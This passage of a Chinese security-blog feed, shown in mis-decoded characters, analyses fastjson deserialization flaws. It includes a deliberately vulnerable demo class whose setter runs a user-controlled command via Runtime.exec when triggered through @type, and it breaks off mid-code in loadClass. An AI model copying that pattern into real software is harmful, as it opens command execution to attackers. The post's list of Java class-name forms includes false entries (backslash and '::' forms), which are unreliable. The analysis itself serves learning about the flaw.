class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java">deserializers.put(SimpleDateFormat.class, MiscCodec.instance);<br>deserializers.put(java.sql.Timestamp.class, SqlDateDeserializer.instance_timestamp);<br>deserializers.put(java.sql.Date.class, SqlDateDeserializer.instance);<br>deserializers.put(java.sql.Time.class, TimeDeserializer.instance);<br>deserializers.put(java.util.Date.class, DateCodec.instance);<br>deserializers.put(Calendar.class, CalendarCodec.instance);<br>deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);<br><br>deserializers.put(JSONObject.class, MapDeserializer.instance);<br>deserializers.put(JSONArray.class, CollectionCodec.instance);<br><br>deserializers.put(Map.class, MapDeserializer.instance);<br>deserializers.put(HashMap.class, MapDeserializer.instance);<br>deserializers.put(LinkedHashMap.class, MapDeserializer.instance);<br>deserializers.put(TreeMap.class, MapDeserializer.instance);<br>deserializers.put(ConcurrentMap.class, MapDeserializer.instance);<br>deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);<br><br>deserializers.put(Collection.class, CollectionCodec.instance);<br>deserializers.put(List.class, CollectionCodec.instance);<br>deserializers.put(ArrayList.class, CollectionCodec.instance);<br><br>deserializers.put(Object.class, JavaObjectDeserializer.instance);<br>deserializers.put(String.class, StringCodec.instance);<br>deserializers.put(StringBuffer.class, StringCodec.instance);<br>deserializers.put(StringBuilder.class, StringCodec.instance);<br>deserializers.put(<span class="hljs-keyword">char</span>.class, CharacterCodec.instance);<br>deserializers.put(Character.class, CharacterCodec.instance);<br>deserializers.put(<span class="hljs-keyword">byte</span>.class, NumberDeserializer.instance);<br>deserializers.put(Byte.class, NumberDeserializer.instance);<br>deserializers.put(<span class="hljs-keyword">short</span>.class, NumberDeserializer.instance);<br>deserializers.put(Short.class, NumberDeserializer.instance);<br>deserializers.put(<span class="hljs-keyword">int</span>.class, IntegerCodec.instance);<br>deserializers.put(Integer.class, IntegerCodec.instance);<br>deserializers.put(<span class="hljs-keyword">long</span>.class, LongCodec.instance);<br>deserializers.put(Long.class, LongCodec.instance);<br>deserializers.put(BigInteger.class, BigIntegerCodec.instance);<br>deserializers.put(BigDecimal.class, BigDecimalCodec.instance);<br>deserializers.put(<span class="hljs-keyword">float</span>.class, FloatCodec.instance);<br>deserializers.put(Float.class, FloatCodec.instance);<br>deserializers.put(<span class="hljs-keyword">double</span>.class, NumberDeserializer.instance);<br>deserializers.put(Double.class, NumberDeserializer.instance);<br>deserializers.put(<span class="hljs-keyword">boolean</span>.class, BooleanCodec.instance);<br>deserializers.put(Boolean.class, BooleanCodec.instance);<br>deserializers.put(Class.class, MiscCodec.instance);<br>deserializers.put(<span class="hljs-keyword">char</span>[].class, <span class="hljs-keyword">new</span> CharArrayCodec());<br><br>deserializers.put(AtomicBoolean.class, BooleanCodec.instance);<br>deserializers.put(AtomicInteger.class, IntegerCodec.instance);<br>deserializers.put(AtomicLong.class, LongCodec.instance);<br>deserializers.put(AtomicReference.class, ReferenceCodec.instance);<br><br>deserializers.put(WeakReference.class, ReferenceCodec.instance);<br>deserializers.put(SoftReference.class, ReferenceCodec.instance);<br><br>deserializers.put(UUID.class, MiscCodec.instance);<br>deserializers.put(TimeZone.class, MiscCodec.instance);<br>deserializers.put(Locale.class, MiscCodec.instance);<br>deserializers.put(Currency.class, MiscCodec.instance);<br>deserializers.put(InetAddress.class, MiscCodec.instance);<br>deserializers.put(Inet4Address.class, MiscCodec.instance);<br>deserializers.put(Inet6Address.class, MiscCodec.instance);<br>deserializers.put(InetSocketAddress.class, MiscCodec.instance);<br>deserializers.put(File.class, MiscCodec.instance);<br>deserializers.put(URI.class, MiscCodec.instance);<br>deserializers.put(URL.class, MiscCodec.instance);<br>deserializers.put(Pattern.class, MiscCodec.instance);<br>deserializers.put(Charset.class, MiscCodec.instance);<br>deserializers.put(JSONPath.class, MiscCodec.instance);<br>deserializers.put(Number.class, NumberDeserializer.instance);<br>deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);<br>deserializers.put(AtomicLongArray.class, AtomicCodec.instance);<br>deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);<br><br>deserializers.put(Serializable.class, JavaObjectDeserializer.instance);<br>deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);<br>deserializers.put(Comparable.class, JavaObjectDeserializer.instance);<br>deserializers.put(Closeable.class, JavaObjectDeserializer.instance);<br></code></pre></td></tr></table></figure></blockquote><h4 id="è¡¥å……çŸ¥è¯†ï¼š"><a href="#è¡¥å……çŸ¥è¯†ï¼š" class="headerlink" title="è¡¥å……çŸ¥è¯†ï¼š"></a>è¡¥å……çŸ¥è¯†ï¼š</h4><h5 id="Javaçš„å…¨ç±»åå†™æ³•ï¼š"><a href="#Javaçš„å…¨ç±»åå†™æ³•ï¼š" class="headerlink" title="Javaçš„å…¨ç±»åå†™æ³•ï¼š"></a>Javaçš„å…¨ç±»åå†™æ³•ï¼š</h5><ol><li>ä»¥ç‚¹å· <code>.</code> åˆ†éš”çš„å®Œæ•´ç±»åï¼Œä¾‹å¦‚ <code>java.lang.Class</code>ã€‚</li><li>ä»¥å­—æ¯ L å¼€å¤´ï¼Œä»¥åˆ†å· <code>;</code> ç»“å°¾çš„ç±»æè¿°ç¬¦ï¼Œä¾‹å¦‚ <code>Ljava/lang/Class;</code>ã€‚</li><li>ä½¿ç”¨åæ–œæ  <code>\</code> ä»£æ›¿æ–œæ  <code>/</code>ï¼Œä¾‹å¦‚ <code>java\lang\Class</code>ï¼Œè¿™ç§æ–¹å¼å¸¸ç”¨äº Windows ç³»ç»Ÿä¸‹çš„æ–‡ä»¶è·¯å¾„ã€‚</li><li>ä½¿ç”¨åŒå†’å· <code>::</code> åˆ†éš”åŒ…åå’Œç±»åï¼Œä¾‹å¦‚ <code>java.lang::Class</code>ï¼Œè¿™ç§æ–¹å¼æ˜¯ Java 8 å¼•å…¥çš„æ–°è¯­æ³•ï¼Œç”¨äºæ–¹æ³•å¼•ç”¨å’Œæ„é€ å‡½æ•°å¼•ç”¨ä¸­ã€‚</li></ol><h3 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h3><p>fastjsonåšå¤§ç²¾æ·±ï¼Œéœ€è¦å­¦çš„ä¸œè¥¿è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä¹Ÿåªæ˜¯çŸ¥é“äº†ä¸€ç‚¹çš®æ¯›ï¼Œåˆæ˜¯è¢«èœğŸ˜­ä¸€å¤©ã€‚</p><h3 id="0x05-å‚è€ƒé“¾æ¥"><a href="#0x05-å‚è€ƒé“¾æ¥" class="headerlink" title="0x05 å‚è€ƒé“¾æ¥"></a>0x05 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://blog.csdn.net/dreamthe/article/details/125851153">Fastjsonå†å²ååºåˆ—æ¼æ´åˆ†æ(1.2.24-1.2.80)</a></li><li><a href="https://xz.aliyun.com/t/8140">FastJson checkAutoTypeå®‰å…¨æœºåˆ¶ç ”ç©¶</a></li><li><a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0">fastjsonååºåˆ—åŒ–æ¼æ´3-&lt;=1.2.47ç»•è¿‡</a></li><li><a href="https://blog.csdn.net/mole_exp/article/details/122315526?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5-122315526-blog-125182603.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5-122315526-blog-125182603.pc_relevant_default&utm_relevant_index=9">Fastjsonååºåˆ—åŒ–é«˜å±æ¼æ´ç³»åˆ—-part2ï¼š1.2.68ååºåˆ—åŒ–æ¼æ´åŠåˆ©ç”¨é“¾åˆ†æ (ä¸Š)</a></li><li><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">How I use a JSON Deserialization 0day to Steal Your Money On The Blockchain</a></li><li><a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/">fastjson 1.2.68 ååºåˆ—åŒ–æ¼æ´ gadgets æŒ–æ˜ç¬”è®°</a></li><li><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">å¾ªç¯å¼•ç”¨</a></li><li><a href="https://github.com/alibaba/fastjson/wiki/JSONPath">JSONPath</a></li><li><a href="https://github.com/su18/hack-fastjson-1.2.80">Kcon Hacking JSON è®®é¢˜ä¹±è®°</a></li><li><a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJson1.2.24</title>
    <link href="/2022/11/12/fastjson1.2.24/"/>
    <url>/2022/11/12/fastjson1.2.24/</url>
    
    <content type="html"><![CDATA[<h2 id="FastJSON"><a href="#FastJSON" class="headerlink" title="FastJSON"></a>FastJSON</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚</p><p>å¥½ç”¨ã€ç”¨çš„å¤šï¼Œå°±å¯¼è‡´ï¼Œè¿™ä¸œè¥¿æœ‰æ¼æ´çš„è¯ï¼Œé‚£å°±æ˜¯å¾ˆé‡è¦çš„äº†ï¼Œæ‰€ä»¥è¿™ä¸œè¥¿çš„æ¼æ´ä¹Ÿæ˜¯èº²ä¸æ‰çš„ï¼›</p><p>fastJsonä»1.2.24ç‰ˆæœ¬å¼€å§‹è¢«å‘ç°æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿä»1.2.24å¼€å§‹äº†</p><h3 id="0x01-ç®€å•ä½¿ç”¨"><a href="#0x01-ç®€å•ä½¿ç”¨" class="headerlink" title="0x01 ç®€å•ä½¿ç”¨"></a>0x01 ç®€å•ä½¿ç”¨</h3><p>fastjsonçš„ä½œç”¨ï¼Œæ€»ç»“ä¸€ä¸‹å°±æ˜¯å¯¹è±¡(JavaBean)-&gt;jsonå­—ç¬¦ä¸²ï¼Œjsonå­—ç¬¦ä¸²-&gt;å¯¹è±¡(JavaBean)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String text = JSON.toJSONString(obj); <span class="hljs-comment">//åºåˆ—åŒ–</span><br>VO vo = JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="hljs-comment">//ååºåˆ—åŒ–</span><br></code></pre></td></tr></table></figure><p>å…ˆå®šä¹‰ä¸€ä¸ªjavaBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> Integer age;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ å™¨è°ƒç”¨...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name, Integer age)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ å™¨è°ƒç”¨...&quot;</span>);<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getNameè°ƒç”¨...&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setNameè°ƒç”¨...&quot;</span>);<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getAgeè°ƒç”¨...&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(Integer age)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAgeè°ƒç”¨...&quot;</span>);<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JavaBeanè½¬JSONå­—ç¬¦ä¸²æ²¡å•¥å¥½çœ‹çš„ï¼Œæ¼æ´ç‚¹ä¹Ÿä¸æ˜¯å‡ºç°åœ¨è¿™é‡Œï¼Œæ‰€ä»¥ç›´æ¥è·³è¿‡ï¼Œä¸»è¦æ˜¯çœ‹JSONè½¬javaå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>    <span class="hljs-comment">// Jsonå­—ç¬¦ä¸²è½¬JavaBean</span><br>    String str1 = <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;zzz\&quot;,\&quot;age\&quot;:15&#125;&quot;</span>;<br>    String str2 = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mechoy.Person\&quot;,\&quot;name\&quot;:\&quot;xxx\&quot;,\&quot;age\&quot;:16&#125;&quot;</span>;<br>    System.out.println(<span class="hljs-string">&quot;-----------parseæµ‹è¯•-----------&quot;</span>);<br>    Object parse = JSON.parse(str1);<br>    System.out.println(<span class="hljs-string">&quot;-----------parseObjectæµ‹è¯•-----------&quot;</span>);<br>    Object parse1 = JSON.parseObject(str1, Person.class);<br>    System.out.println(<span class="hljs-string">&quot;-----------@type parseæµ‹è¯•-----------&quot;</span>);<br>    Object parse2 = JSON.parse(str2);<br>    System.out.println(<span class="hljs-string">&quot;-----------@type parseObjectæµ‹è¯•-----------&quot;</span>);<br>    JSONObject jsonObject = JSON.parseObject(str2);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/12/fastjson1.2.24/1.png"></p><h3 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h3><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h4><p>ä»ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼šå½“åœ¨jsonå­—ç¬¦ä¸²ä¸­ä½¿ç”¨@typeå»æŒ‡å®šJavaBeanæ—¶ï¼ŒæœåŠ¡ç«¯ä¼šå»è°ƒç”¨ç›¸åº”çš„æ— å‚æ„é€ å™¨ã€setterã€getteræ–¹æ³•ï¼Œå¹¶ä¸”**<code>@type</code>æ—¶å®¢æˆ·ç«¯ä¼ è¾“<strong>è¿‡æ¥çš„(çœŸå®åœºæ™¯ä¸‹:ä¸€èˆ¬ä½¿ç”¨jsonè¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œç„¶ååœ¨æœåŠ¡ç«¯ä¼šä¼˜å…ˆè¿›è¡Œjsonè§£æ)ï¼Œæ‰€ä»¥å°±æ˜¯@typeå¯æ§ï¼Œå¹¶ä¸”</strong>å±æ€§çš„å€¼ä¹ŸåŒæ ·å¯æ§<strong>ï¼Œæœ€åå°±æ˜¯ä¼š</strong>è‡ªåŠ¨è°ƒç”¨é»˜è®¤æ„é€ å™¨ã€setterã€getteræ–¹æ³•**ã€‚ä¸€èˆ¬è‡ªåŠ¨è°ƒç”¨æ—¶å°±å®¹æ˜“å‡ºé—®é¢˜ï¼Œå°±æ¯”å¦‚ååºåˆ—åŒ–ã€‚</p><p>å‡è®¾ï¼šå½“ä¸€ä¸ªJavaBeançš„æ— å‚æ„é€ å™¨ã€setterã€getteræ–¹æ³•ä¸­å­˜åœ¨å±é™©æ–¹æ³•ã€æˆ–èƒ½å¤Ÿé—´æ¥çš„è°ƒç”¨åˆ°å±é™©æ–¹æ³•ç­‰ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚ä¸¾ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æµ‹è¯•JavaBeanä¸­å­˜åœ¨å±é™©æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Execute</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String cmd;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Execute</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Execute</span><span class="hljs-params">(String cmd)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        Runtime.getRuntime().exec(<span class="hljs-keyword">this</span>.cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/12/fastjson1.2.24/2.png"></p><p>å½“ç„¶ï¼ŒçœŸå®ç¯å¢ƒæ˜¯ä¸å¯èƒ½æœ‰è¿™ç§æƒ…å†µçš„ï¼Œè¿™é‡Œåªæ˜¯åšä¸€ä¸ªç®€å•çš„ä¸¾ä¾‹ï¼›</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ¥çœ‹ä¸€ä¸‹ï¼Œfastjsonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™åˆ°åº•åšäº†å“ªäº›äº‹æƒ…</p><h4 id="æºç å‰–æ"><a href="#æºç å‰–æ" class="headerlink" title="æºç å‰–æ"></a>æºç å‰–æ</h4><p>ç›´æ¥ä»<code>parseObject()</code>å…¥æ‰‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">parseObject</span><span class="hljs-params">(String text)</span> </span>&#123;<br>    Object obj = parse(text);<span class="hljs-comment">// å…ˆè°ƒç”¨äº†ä¸€ä¸ªparse() å…¶å®è¿™ä¸ªå’ŒJSON.parse()ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç†è§£ä¸ºéƒ½ä¼šèµ°åˆ°parse</span><br>    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>        <span class="hljs-keyword">return</span> (JSONObject) obj;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (JSONObject) JSON.toJSON(obj);<span class="hljs-comment">// å°†objè½¬ä¸ºJSONObject</span><br>    <span class="hljs-comment">// JSONObjectå…¶å®ç±»ä¼¼äºä¸€ä¸ªMap,é‡Œé¢å°†jsonå­—ç¬¦ä¸²è½¬ä¸ºé”®å€¼å¯¹çš„å½¢å¼ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ç†è§£ä¸ºå˜ç›¸çš„JavaBean</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥è·Ÿè¿›<code>parse(text)</code>ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å‡ ä¸ªæ–¹æ³•çš„é‡è½½ï¼Œç›´æ¥æ¥åˆ°<code>com.alibaba.fastjson.JSON#parse(java.lang.String, int)</code></p><p><img src="/2022/11/12/fastjson1.2.24/3.png"></p><p>è·Ÿè¿›æ¥åˆ°<code>com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object)</code>è¿™é‡Œé¢æ˜¯å¯¹JSONå­—ç¬¦ä¸²çš„å¾ˆå¤šåˆ¤æ–­ï¼Œæ ¹æ®</p><p><code>lexer.token()</code>è¿›è¡Œswitchçš„é€‰æ‹©ï¼Œ<code>lexer.token()</code>çš„å€¼åˆæ˜¯æ ¹æ®JSONå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½å­—ç¬¦å†³å®šçš„ï¼Œå¯ä»¥æš‚ä¸”ç†è§£ä¸ºï¼šä¸åŒæ ¼å¼çš„JSONå­—ç¬¦ä¸²å§</p><p><img src="/2022/11/12/fastjson1.2.24/4.png"></p><p>è·Ÿè¿›åæ¥åˆ°<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>è¿™é‡Œä¹Ÿæ˜¯ä¸€å¤§å †åˆ¤æ–­ï¼Œemmmï¼Œä¸€æ­¥æ­¥èµ°å§ï¼Œæ¥åˆ°è¿™é‡Œï¼ŒæŸ¥æ‰¾äº†ä¸€ä¸‹JSONæ˜¯å¦å­˜åœ¨<code>@type</code>æˆ–è€…<code>$ref</code>è¿™ç§ç‰¹æ®Šç¬¦å·å¼€å¤´ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯å°†å¸¸è§„JSONå­—ç¬¦å’ŒJavaBeanè¿›è¡Œä¸€ä¸ªåŒºåˆ†æ“ä½œäº†ï¼Œåº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œç»§ç»­å‘ä¸‹</p><p><img src="/2022/11/12/fastjson1.2.24/5.png"></p><p>ä¸€è·¯å‘ä¸‹ï¼Œä¸€ç›´èµ°åˆ°è¿™é‡Œï¼Œå¯¹keyè¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œæ˜¯@typeçš„è¯ï¼Œå°±è·å–åé¢çš„å…¨ç±»åï¼Œç„¶åè¿›è¡Œä¸€ä¸ªç±»åŠ è½½ï¼Œ</p><p><img src="/2022/11/12/fastjson1.2.24/6.png"></p><p>è¿™ä¸ªç±»åŠ è½½ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ç®€å•çœ‹ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ é™¤äº†ä¸€äº›ä¸é‡è¦çš„åœ°æ–¹</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;<br>    <span class="hljs-keyword">if</span> (className == <span class="hljs-keyword">null</span> || className.length() == <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;<span class="hljs-comment">// çœ‹ä¸‹ç±»åæ˜¯ä¸æ˜¯ç©ºæˆ–&quot;&quot;</span><br><br>    Class&lt;?&gt; clazz = mappings.get(className);<span class="hljs-comment">// æ£€æŸ¥è¯¥ç±»æ˜¯å¦æ˜¯å·²åŠ è½½ï¼Œmappingsä¸ºä¸€äº›åŸºæœ¬æ•°æ®ç±»å‹ã€hashMapç­‰</span><br><br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">return</span> clazz;&#125;<br><br>    <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<span class="hljs-comment">// åˆ¤æ–­åŠ è½½çš„æ˜¯å¦æ˜¯æ•°ç»„ç±»ï¼Œæ˜¯çš„è¯ï¼Œåˆ™åˆ é™¤å…¨ç±»åä¸­ç¬¬ä¸€ä½çš„[,åœ¨è¿›è¡ŒåŠ è½½</span><br>        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>        <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>    &#125;<br><span class="hljs-comment">// æ˜¯å¦æ˜¯ä»¥Lå¼€å¤´çš„å…¨ç±»åæˆ–æ¥å£åï¼Œæ˜¯çš„è¯ï¼Œå°±åˆ é™¤Lå’Œæœ€åçš„;ç„¶åè¿›è¡Œç±»åŠ è½½</span><br>    <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>        String newClassName = className.substring(<span 